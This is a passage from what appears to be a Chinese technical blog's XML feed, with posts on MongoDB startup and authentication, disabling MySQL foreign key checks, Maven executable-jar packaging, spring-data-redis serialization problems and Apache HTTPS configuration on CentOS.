<h2 id="以后台运行方式启动mongodb"><a href="#以后台运行方式启动mongodb" class="headerlink" title="以后台运行方式启动mongodb"></a>以后台运行方式启动mongodb</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/mongodb/bin/mongod --dbpath=/usr/local/mongodb/data --logpath=/usr/local/mongodb/logs/mongodb.log --fork</span><br></pre></td></tr></table></figure>
<h2 id="设置开机自启动："><a href="#设置开机自启动：" class="headerlink" title="设置开机自启动："></a>设置开机自启动：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;/usr/local/mongodb/bin/mongod --auth --dbpath=/usr/local/mongodb/data --logpath=/usr/local/mongodb/logs/mongodb.log --fork&quot; &gt;&gt; /etc/rc.local</span><br></pre></td></tr></table></figure>
<h2 id="查看mongodb进程"><a href="#查看mongodb进程" class="headerlink" title="查看mongodb进程"></a>查看mongodb进程</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux |grep mongodb</span><br></pre></td></tr></table></figure>
</li>
<li><p>进入客户端</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/mongodb/bin/mongo</span><br><span class="line">use test;</span><br><span class="line">db.createUser(&#123;user:&quot;test&quot;, pwd:&quot;test&quot;, roles: [&#123;role: &quot;readWrite&quot;, db: &quot;test&quot;&#125;]&#125;);</span><br></pre></td></tr></table></figure>
</li>
<li><p>终止mongodb服务</p>
<p>使用带auth认证启动</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/mongodb/bin/mongod --auth --dbpath=/usr/local/mongodb/data --logpath=/usr/local/mongodb/logs/mongodb.log --fork</span><br></pre></td></tr></table></figure>
<p>修复数据库</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongod --repair --dbpath /usr/local/mongodb/data --repairpath /usr/local/mongodb</span><br></pre></td></tr></table></figure>
<p>​</p>
<p>连接脚本​</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./mongo --host 127.0.0.1:27017 --authenticationDatabase admin -u root -p root</span><br></pre></td></tr></table></figure></li>
</ol>
]]></content>
      
        <categories>
            
            <category> mongodb </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux </tag>
            
            <tag> mongodb </tag>
            
            <tag> 安装 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql 有外键关联时删除数据]]></title>
      <url>/2017/mysql-delete-or-update-foreign-key-data/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 mysql 有外键关联时如何删除数据</p>
<p>删除或更新外键数据 （不推荐正式环境使用）<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET FOREIGN_KEY_CHECKS=0; -- to disable</span><br><span class="line">SET FOREIGN_KEY_CHECKS=1; -- to re-enable</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> mysql </category>
            
        </categories>
        
        
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 外键 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[maven 打包可执行jar]]></title>
      <url>/2017/maven-package-execute-jar/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 maven打包可执行jar配置<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">&lt;build&gt;</span><br><span class="line">    &lt;finalName&gt;$&#123;project.artifactId&#125;&lt;/finalName&gt;</span><br><span class="line">    &lt;plugins&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;maven-compiler-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;configuration&gt;</span><br><span class="line">                &lt;source&gt;1.8&lt;/source&gt;</span><br><span class="line">                &lt;target&gt;1.8&lt;/target&gt;</span><br><span class="line">                &lt;encoding&gt;utf-8&lt;/encoding&gt;</span><br><span class="line">            &lt;/configuration&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;maven-jar-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;configuration&gt;</span><br><span class="line">                &lt;archive&gt;</span><br><span class="line">                    &lt;manifest&gt;</span><br><span class="line">                        &lt;addClasspath&gt;true&lt;/addClasspath&gt;</span><br><span class="line">                        &lt;classpathPrefix&gt;lib/&lt;/classpathPrefix&gt;</span><br><span class="line">                        &lt;!-- 入口类名 --&gt;</span><br><span class="line">                        &lt;mainClass&gt;org.xxz.test.Main&lt;/mainClass&gt;</span><br><span class="line">                        &lt;useUniqueVersions&gt;false&lt;/useUniqueVersions&gt;</span><br><span class="line">                    &lt;/manifest&gt;</span><br><span class="line">                    &lt;manifestEntries&gt;</span><br><span class="line">                        &lt;class-Path&gt;./&lt;/class-Path&gt;</span><br><span class="line">                    &lt;/manifestEntries&gt;</span><br><span class="line">                &lt;/archive&gt;</span><br><span class="line">            &lt;/configuration&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;maven-dependency-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;executions&gt;</span><br><span class="line">                &lt;execution&gt;</span><br><span class="line">                    &lt;id&gt;copy&lt;/id&gt;</span><br><span class="line">                    &lt;phase&gt;package&lt;/phase&gt;</span><br><span class="line">                    &lt;goals&gt;</span><br><span class="line">                        &lt;goal&gt;copy-dependencies&lt;/goal&gt;</span><br><span class="line">                    &lt;/goals&gt;</span><br><span class="line">                    &lt;configuration&gt;</span><br><span class="line">                        &lt;!-- 拷贝所以依赖存放位置 --&gt;</span><br><span class="line">                        &lt;outputDirectory&gt;$&#123;project.build.directory&#125;/lib&lt;/outputDirectory&gt;</span><br><span class="line">                    &lt;/configuration&gt;</span><br><span class="line">                &lt;/execution&gt;</span><br><span class="line">            &lt;/executions&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">        &lt;!-- 项目资源插件 --&gt;</span><br><span class="line">        &lt;plugin&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.maven.plugins&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;maven-resources-plugin&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.0.2&lt;/version&gt;</span><br><span class="line">            &lt;executions&gt;</span><br><span class="line">                &lt;execution&gt;</span><br><span class="line">                    &lt;id&gt;copy-command&lt;/id&gt;</span><br><span class="line">                    &lt;phase&gt;package&lt;/phase&gt;</span><br><span class="line">                    &lt;goals&gt;</span><br><span class="line">                        &lt;goal&gt;copy-resources&lt;/goal&gt;</span><br><span class="line">                    &lt;/goals&gt;</span><br><span class="line">                    &lt;configuration&gt;</span><br><span class="line">                        &lt;encoding&gt;UTF-8&lt;/encoding&gt;</span><br><span class="line">                        &lt;!-- 只拷贝项目src/main/resources/目录下的.bat .sh文件到输出目录下 --&gt;</span><br><span class="line">                        &lt;outputDirectory&gt;$&#123;project.build.directory&#125;/&lt;/outputDirectory&gt;</span><br><span class="line">                        &lt;resources&gt;</span><br><span class="line">                            &lt;resource&gt;</span><br><span class="line">                                &lt;directory&gt;src/main/resources/&lt;/directory&gt;</span><br><span class="line">                                &lt;filtering&gt;true&lt;/filtering&gt;</span><br><span class="line">                                &lt;includes&gt;</span><br><span class="line">                                    &lt;include&gt;*.bat&lt;/include&gt;</span><br><span class="line">                                    &lt;include&gt;*.sh&lt;/include&gt;</span><br><span class="line">                                &lt;/includes&gt;</span><br><span class="line">                            &lt;/resource&gt;</span><br><span class="line">                        &lt;/resources&gt;</span><br><span class="line">                    &lt;/configuration&gt;</span><br><span class="line">                &lt;/execution&gt;</span><br><span class="line">            &lt;/executions&gt;</span><br><span class="line">        &lt;/plugin&gt;</span><br><span class="line">    &lt;/plugins&gt;</span><br><span class="line">&lt;/build&gt;</span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> maven </tag>
            
            <tag> 打包 </tag>
            
            <tag> 可执行jar </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[谈谈spring-data-redis遇到的问题]]></title>
      <url>/2017/spring-redis-question/</url>
      <content type="html"><![CDATA[<p>[TOC]</p>
<h3 id="1-key序列化问题"><a href="#1-key序列化问题" class="headerlink" title="1. key序列化问题"></a>1. key序列化问题</h3><p>使用spring-data-redis中的redisTemplate存储key-value，然后使用redis-cli去查询时查询不到相应的key。使用keys *时发现redis中key的前缀多了一些字符<br><a id="more"></a><br>\xac\xed\x00\x05t\x00\x0e</p>
<p><img src="http://wx4.sinaimg.cn/mw690/afc434bdly1fhqn3knmn8j20dx045aa0.jpg" alt=""></p>
<h3 id="问题关键"><a href="#问题关键" class="headerlink" title="问题关键"></a>问题关键</h3><p>使用spring-data-redis，默认情况下使用的是org.springframework.data.redis.serializer.JdkSerializationRedisSerializer来进行序列化key</p>
<p>我们看看关键代码 RedisTemplate</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterPropertiesSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">super</span>.afterPropertiesSet();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">boolean</span> defaultUsed = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (defaultSerializer == <span class="keyword">null</span>) &#123;</span><br><span class="line"></span><br><span class="line">            defaultSerializer = <span class="keyword">new</span> JdkSerializationRedisSerializer(</span><br><span class="line">                    classLoader != <span class="keyword">null</span> ? classLoader : <span class="keyword">this</span>.getClass().getClassLoader());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (enableDefaultSerializer) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (keySerializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">                keySerializer = defaultSerializer;</span><br><span class="line">                defaultUsed = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (valueSerializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">                valueSerializer = defaultSerializer;</span><br><span class="line">                defaultUsed = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (hashKeySerializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">                hashKeySerializer = defaultSerializer;</span><br><span class="line">                defaultUsed = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (hashValueSerializer == <span class="keyword">null</span>) &#123;</span><br><span class="line">                hashValueSerializer = defaultSerializer;</span><br><span class="line">                defaultUsed = <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (enableDefaultSerializer &amp;&amp; defaultUsed) &#123;</span><br><span class="line">            Assert.notNull(defaultSerializer, <span class="string">"default serializer null and not all serializers initialized"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (scriptExecutor == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.scriptExecutor = <span class="keyword">new</span> DefaultScriptExecutor&lt;K&gt;(<span class="keyword">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        initialized = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="解决问题"><a href="#解决问题" class="headerlink" title="解决问题"></a>解决问题</h3><p>手动设置key的序列化方式为StringRedisSerializer</p>
<p>看代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> RedisTemplate&lt;String, ?&gt; redisTemplate(RedisConnectionFactory factory) &#123;</span><br><span class="line">    RedisTemplate&lt;String, Object&gt; redisTemplate = <span class="keyword">new</span> RedisTemplate();</span><br><span class="line">    redisTemplate.setConnectionFactory(factory);</span><br><span class="line">    RedisSerializer&lt;String&gt; stringRedisSerializer = <span class="keyword">new</span> StringRedisSerializer();</span><br><span class="line">    redisTemplate.setKeySerializer(stringRedisSerializer);</span><br><span class="line">  	redisTemplate.setValueSerializer(<span class="keyword">new</span> GenericJackson2JsonRedisSerializer());</span><br><span class="line">    <span class="keyword">return</span> redisTemplate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="2-value-序列化问题"><a href="#2-value-序列化问题" class="headerlink" title="2. value 序列化问题"></a>2. value 序列化问题</h3><p>我们在使用无参构造GenericJackson2JsonRedisSerializer序列化对象时，序列化出来的值是这样的</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"@class"</span>: <span class="string">"com.xxx.MenuTask"</span>,</span><br><span class="line">  <span class="attr">"taskId"</span>: <span class="string">"1617776640"</span>,</span><br><span class="line">  <span class="attr">"planId"</span>: <span class="string">"10000000"</span>,</span><br><span class="line">  <span class="attr">"createTime"</span>: [</span><br><span class="line">    <span class="string">"java.util.Date"</span>,</span><br><span class="line">    <span class="number">1500540438240</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"execDate"</span>: [</span><br><span class="line">    <span class="string">"java.util.Date"</span>,</span><br><span class="line">    <span class="number">1500480000000</span></span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">"status"</span>: <span class="number">0</span>,</span><br><span class="line">  <span class="attr">"totals"</span>: &#123;</span><br><span class="line">    <span class="attr">"@class"</span>: <span class="string">"java.util.HashMap"</span>,</span><br><span class="line">    <span class="attr">"35430d2a56ae508f24a76a68e71b9f53"</span>: <span class="number">1500</span>,</span><br><span class="line">    <span class="attr">"75aa86c5a85f65687c95444655c51de9"</span>: <span class="number">500</span>,</span><br><span class="line">    <span class="attr">"ab90efa7a0079b88f224a296b211c209"</span>: <span class="number">1000</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样的json格式使用其他的json序列化时会出现无法解析的错误，如fastjson解析时会抛出异常</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">com.alibaba.fastjson.JSONException: parse error</span><br><span class="line">	at com.alibaba.fastjson.serializer.DateCodec.cast(DateCodec.java:<span class="number">206</span>)</span><br><span class="line">	at com.alibaba.fastjson.parser.deserializer.AbstractDateDeserializer.deserialze(AbstractDateDeserializer.java:<span class="number">142</span>)</span><br><span class="line">	at com.alibaba.fastjson.parser.deserializer.AbstractDateDeserializer.deserialze(AbstractDateDeserializer.java:<span class="number">19</span>)</span><br><span class="line">	at com.alibaba.fastjson.parser.deserializer.DefaultFieldDeserializer.parseField(DefaultFieldDeserializer.java:<span class="number">71</span>)</span><br><span class="line">	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.parseField(JavaBeanDeserializer.java:<span class="number">790</span>)</span><br><span class="line">	at com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer.deserialze(JavaBeanDeserializer.java:<span class="number">595</span>)</span><br></pre></td></tr></table></figure>
<p>主要原因是因为Date格式不正确，应该是一个long类型的数字，而不是一个数组</p>
<h3 id="问题关键-1"><a href="#问题关键-1" class="headerlink" title="问题关键"></a>问题关键</h3><p>我们来分析一下源码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GenericJackson2JsonRedisSerializer</span> <span class="keyword">implements</span> <span class="title">RedisSerializer</span>&lt;<span class="title">Object</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> ObjectMapper mapper;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	 * Creates &#123;<span class="doctag">@link</span> GenericJackson2JsonRedisSerializer&#125; and configures &#123;<span class="doctag">@link</span> ObjectMapper&#125; for default typing.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">GenericJackson2JsonRedisSerializer</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>((String) <span class="keyword">null</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">GenericJackson2JsonRedisSerializer</span><span class="params">(String classPropertyTypeName)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">this</span>(<span class="keyword">new</span> ObjectMapper());</span><br><span class="line"><span class="comment">//------------------------ start ------------------------</span></span><br><span class="line">		mapper.registerModule(<span class="keyword">new</span> SimpleModule().addSerializer(<span class="keyword">new</span> NullValueSerializer(classPropertyTypeName)));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (StringUtils.hasText(classPropertyTypeName)) &#123;</span><br><span class="line">			mapper.enableDefaultTypingAsProperty(DefaultTyping.NON_FINAL, classPropertyTypeName);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			mapper.enableDefaultTyping(DefaultTyping.NON_FINAL, As.PROPERTY);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">//------------------------ end ------------------------</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">GenericJackson2JsonRedisSerializer</span><span class="params">(ObjectMapper mapper)</span> </span>&#123;</span><br><span class="line">		Assert.notNull(mapper, <span class="string">"ObjectMapper must not be null!"</span>);</span><br><span class="line">		<span class="keyword">this</span>.mapper = mapper;</span><br><span class="line">	&#125;</span><br><span class="line">	...</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>原因所在地方 // —- start —- // —- end —-之间的那段代码 源码的63-69行，这里会将属性的类型写到json中。</p>
<h3 id="解决问题-1"><a href="#解决问题-1" class="headerlink" title="解决问题"></a>解决问题</h3><p>手动设置一个ObjectMapper，这样redisTemplate.setValueSerializer(new GenericJackson2JsonRedisSerializer(new ObjectMapper()));</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line"><span class="keyword">public</span> RedisTemplate&lt;String, ?&gt; redisTemplate(RedisConnectionFactory factory) &#123;</span><br><span class="line">    RedisTemplate&lt;String, Object&gt; redisTemplate = <span class="keyword">new</span> RedisTemplate();</span><br><span class="line">    redisTemplate.setConnectionFactory(factory);</span><br><span class="line">    RedisSerializer&lt;String&gt; stringRedisSerializer = <span class="keyword">new</span> StringRedisSerializer();</span><br><span class="line">    redisTemplate.setKeySerializer(stringRedisSerializer);</span><br><span class="line">    redisTemplate.setValueSerializer(<span class="keyword">new</span> GenericJackson2JsonRedisSerializer(<span class="keyword">new</span> ObjectMapper()));</span><br><span class="line">    <span class="keyword">return</span> redisTemplate;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> java </category>
            
        </categories>
        
        
        <tags>
            
            <tag> java </tag>
            
            <tag> redis </tag>
            
            <tag> spring </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[centos7上apache2配置https]]></title>
      <url>/2016/centos7-apache2-config-https/</url>
      <content type="html"><![CDATA[<p>本文将告诉你怎么去配置apache2的https</p>
<p>前提条件： </p>
<ol>
<li>安装了apache2</li>
<li>apache2所在目录是/usr/local/</li>
<li><p>ssl证书已上传到了apache2/conf 目录下(一般是一个zip包) 如果名称不叫ssl.zip 请把名称改成ssl.zip (mv xxxx.zip ssl.zip)</p>
<a id="more"></a>
<h2 id="准备安装"><a href="#准备安装" class="headerlink" title="准备安装"></a>准备安装</h2></li>
<li><p>首先用root账户登录到linux服务器</p>
</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/apache2/conf/</span><br><span class="line">ls #查看当前目录下的所有文件</span><br><span class="line">unzip -o ssl.zip -d ssl</span><br></pre></td></tr></table></figure>
<h2 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h2><p>1.打开 apache 安装目录下 conf 目录中的 httpd.conf 文件，找到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/local/apache2/conf/httpd.conf</span><br><span class="line">\#LoadModule ssl_module modules/mod_ssl.so (如果找不到请确认是否编译过 openssl 插件)</span><br><span class="line">\#Include conf/extra/httpd_ssl.conf</span><br><span class="line">\#把以上两句话前面的#去掉</span><br></pre></td></tr></table></figure>
<p>2.打开 apache 安装目录下 conf/extra 目录中的 httpd-ssl.conf 文件 ( 注释:yum 安装配置目录：conf.d/ssl.confubuntu/apache2 安装目录:conf/sites-enabled/*.conf )， 在配置文件中查找以下配置语句:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">vi /usr/local/apache2/conf/extra/httpd-ssl.conf</span><br><span class="line">#找到对应的代码进行修改，找不到的进行添加</span><br><span class="line">#·添加 SSL 协议支持语句,关闭不安全的协议和加密套件</span><br><span class="line">SSLProtocol all -SSLv2 -SSLv3</span><br><span class="line">#·修改加密套件如下</span><br><span class="line">SSLCipherSuite AESGCM:ALL:!DH:!EXPORT:!RC4:+HIGH:!MEDIUM:!LOW:!aNULL:!eNULL;</span><br><span class="line">#·将服务器证书公钥配置到该路径下(在 conf 目录下创建 ssl 目录,将 for Apache 里面的三 个证书文件拷贝到 ssl 目录下)</span><br><span class="line">SSLCertificateFile conf/ssl/public.pem (证书公钥)</span><br><span class="line">#·将服务器证书私钥配置到该路径下</span><br><span class="line">SSLCertificateKeyFile conf/ssl/订单号.key (证书私钥)</span><br><span class="line">#·将服务器证书链配置到该路径下</span><br><span class="line">SSLCertificateChainFile conf/ssl/chain.pem (证书链)删除行首的“#”号注释符</span><br><span class="line">#保存退出。</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure>
<p>3.重启 Apache。重启方式：进入 Apache 安装目录下的 bin 目录,运行如下命令 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/apache2/bin/</span><br><span class="line">./apachectl -k stop./apachectl -k start</span><br></pre></td></tr></table></figure>
<h2 id="配置网站目录"><a href="#配置网站目录" class="headerlink" title="配置网站目录"></a>配置网站目录</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vi /user/local/apache2/conf/extra/httpd-ssl.conf</span><br><span class="line">#找到</span><br><span class="line">&lt;VirtualHost _default_:443&gt;</span><br><span class="line">DocumentRoot &quot;/usr/local/apache2/htdocs&quot;</span><br><span class="line">#修改 &quot;/usr/local/apache2/htdocs&quot; ----&gt; &quot;/yjdata/www/www/&quot;</span><br><span class="line">ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:10000/yjdata/www/www/$1</span><br><span class="line">DirectoryIndex index.html index.php</span><br><span class="line">ServerName 你的域名:443</span><br><span class="line">:wq</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> centos </tag>
            
            <tag> apache2 </tag>
            
            <tag> https </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[mysql-5.7.x安装]]></title>
      <url>/2016/mysql-5-7-x-install/</url>
      <content type="html"><![CDATA[<p>这篇文章主要讲解 mysql-5.7.x安装</p>
